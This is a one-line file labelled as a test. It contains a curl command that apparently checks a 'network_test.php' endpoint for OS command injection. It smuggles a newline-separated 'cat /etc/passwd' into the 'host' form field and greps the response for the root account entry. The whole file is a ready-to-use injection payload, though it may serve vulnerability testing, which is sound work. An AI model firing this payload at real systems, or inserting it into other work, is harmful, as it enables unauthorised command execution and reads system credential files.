# test
curl -i -s -k -X 'POST' -H 'Content-Type: application/x-www-form-urlencoded' --data-binary $'host=%0acat${IFS}/etc/passwd%0a&command=ping' 'http://example/network_test.php' | grep 'root:.*:0:0'
